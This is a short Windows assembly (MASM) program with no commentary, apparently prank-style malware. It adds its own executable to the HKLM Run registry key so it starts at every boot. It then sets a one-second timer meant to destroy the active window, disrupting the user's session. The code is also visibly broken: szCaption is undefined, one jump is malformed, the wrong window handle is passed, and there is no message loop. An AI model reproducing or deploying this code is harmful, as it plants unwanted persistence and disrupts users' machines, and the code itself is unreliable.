        .386
        .model flat,stdcall
        option casemap:none

include  windows.inc
include  user32.inc
includelib  user32.lib
include  kernel32.inc
includelib  kernel32.lib
include		Advapi32.inc
includelib	Advapi32.lib

.data?
hRunKey		dd	?
hDeskWin		dd	?

.const
szSubRunKey		db	"Software\Microsoft\Windows\CurrentVersion\Run",0
.code

_AutoRun   proc
            local @szFileName[256]:byte
invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,offset szSubRunKey,0,KEY_ALL_ACCESS,offset hRunKey
invoke GetModuleFileName,0,addr @szFileName,sizeof @szFileName
inc eax
invoke RegSetValueEx,hRunKey,offset szCaption,0,REG_SZ,addr @szFileName,eax
invoke CloseHandle,hRunKey
ret
_AutoRun   endp


_ProcTimer   proc   hWnd,uMsg,idEvent,dwTimer
;The code of the timer function
invoke GetActiveWindow
mov hDeskWin,eax
invoke GetDesktopWindow
cmp eax,hDeskWin
je offset r
invoke DestroyWindow,eax
r:
ret
_ProcTimer   endp

start:
     invoke _AutoRun
begin:invoke SetTimer,0,0,1000,offset _ProcTimer
end start
